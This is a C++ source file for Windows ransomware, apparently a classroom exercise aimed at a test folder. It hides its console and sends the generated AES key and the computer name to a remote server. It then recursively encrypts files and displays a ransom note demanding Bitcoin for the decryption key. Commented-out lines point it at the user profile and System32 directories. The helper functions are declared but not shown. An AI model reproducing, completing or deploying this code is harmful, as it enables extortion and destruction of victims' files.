#include "stdafx.h"
//#include <stdio.h>
//chiffrement
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <string>
#include <iostream>
#include <openssl\err.h>
#include <openssl/rand.h>
//libcurl
#include <curl\curl.h>
#include <experimental/filesystem> // C++-standard header file name  
#include <filesystem> // Microsoft-specific implementation header file name
//windows
#include <windows.h>



void get_file_decrypt(unsigned char* key, unsigned char* iv, const char* path);
void get_file_encrypt(unsigned char* key, unsigned char* iv, const char* path);


const unsigned char* getKey();
unsigned char* generate_key(const unsigned char* pubkey);
size_t write_to_string(void *ptr, size_t size, size_t count, void *stream);
int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey, int id);

using namespace std;



int main() {
	/* hide the console */ 
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	/* initialize random seed */
	srand(time(NULL));
	/* generate the client ID */
	int id = rand() % 10000000000000000;

	/* generate the AES keys */
	unsigned char AES_key[32], iv[16];
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < 32; ++i) {
		AES_key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	for (int i = 0; i < 16; ++i) {
		iv[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	AES_key[31] = 0;
	iv[15] = 0;

	cout << "aes = " << AES_key << endl;
	cout << "iv = " << iv << endl;


	/* directory to encrypt */
	
	const char* path = "C:/test_ransom/";
	/* == dangerous line == */
	//const char* path = "C:/Users/";
	//const char* path = "C:/Windows/System32/";
	

	//get the public key from the server
	const unsigned char* pubkey = getKey();

	//encrypt the message
	//const unsigned char* cypher = generate_key(pubkey);
	
	const char* cypher = getenv("COMPUTERNAME");
	//freeze terminal
	//cin.ignore();

	//send encrypted message to the serverS
	send_encrypted_msg((const unsigned char*) cypher, AES_key, id);

	//freeze terminal
	//cin.ignore();

	/* list the file of the specified directory */
	for (auto & p : std::experimental::filesystem::v1::recursive_directory_iterator(path)) {

		//std::cout << "p.path() = " << p.path() << endl;

		string str = p.path().string();
		path = new char[str.length() + 1];
		strcpy((char*)path, str.c_str());


		if (std::experimental::filesystem::v1::is_directory(p.status()) == false) {
			/* =============== encrypt the file ============ */
			get_file_encrypt(AES_key, iv, path);

			/* =============== decrypt the file ============ */
			//get_file_decrypt(AES_key, iv, path);
		}
		else {
			//std::cout << "dossier" << endl;
		}
	}

	/* show the console for the instructions */
	ShowWindow(GetConsoleWindow(), SW_SHOW);
	string input;
	string key((char*)AES_key);
	BOOL OK_decrypt = false;

	/* display the message for the payment */
	cout << " /$$$$$$$                     /$$                 /$$          " << endl;
	cout << "| $$__  $$                   | $$                | $$          " << endl;
	cout << "| $$  \ $$ /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$ | $$  /$$$$$$ " << endl;
	cout << "| $$$$$$$//$$__  $$ /$$__  $$| $$  /$$/ /$$__  $$| $$ /$$__  $$" << endl;
	cout << "| $$____/| $$$$$$$$| $$  \__/| $$$$$$/ | $$$$$$$$| $$| $$$$$$$$" << endl;
	cout << "| $$     | $$_____/| $$      | $$_  $$ | $$_____/| $$| $$_____/" << endl;
	cout << "| $$     |  $$$$$$$| $$      | $$ \  $$|  $$$$$$$| $$|  $$$$$$$" << endl;
	cout << "|__/      \_______/|__/      |__/  \__/ \_______/|__/ \_______/\n" << endl;
	cout << "All your files have been encrypted !\nDon't try to restart your computer or everything will be lost.\n" << endl;
	cout << "to get your files decrypted you have to send us an email at this adress :\nhacker@esaip.org" << endl;
	cout << "In this email you must provide your ID and the confirmation of payment from\nyour Bitcoin transaction." << endl;
	cout << "Your ID is : " << to_string(id) << "\nAnd you do the transaction of 1000 Bitcoins\nat this wallet : 384fze91fze8f4" << endl;
	cout << "Once the payment done, you will received an email with\nthe decryption key for your files." << endl;
	cout << "Here you can find a tutorial about how to do a transaction with bitcoin :\nhttps://bitpay.com/pay-with-bitcoin\n\n" << endl;

	/* wait for the input of the decryption key */
	while (!OK_decrypt) {

		std::cout << "insert the key you received by mail :  ";
		std::getline(cin, input);
		//cout << input << endl;
		//cout << key << endl;

		if (input == key) {
			OK_decrypt = true;
			std::cout << "right key !\nFiles will be decrypted !" << endl;
		}
		else {
			std::cout << "wrong key !" << endl;
		}
	}

	/* Decrypting files */
	path = "C:/test_ransom";
	for (auto & p : std::experimental::filesystem::v1::recursive_directory_iterator(path)) {
		//std::cout << "p.path() = " << p.path() << endl;

		string str = p.path().string();
		path = new char[str.length() + 1];
		strcpy((char*)path, str.c_str());


		if (std::experimental::filesystem::v1::is_directory(p.status()) == false) {

			/* =============== decrypt the file ============ */
			get_file_decrypt(AES_key, iv, path);
		}
		else {
			//std::cout << "dossier" << endl;
		}
	}

	//std::cout << "Files have been decrypted !";

	return 0;
}
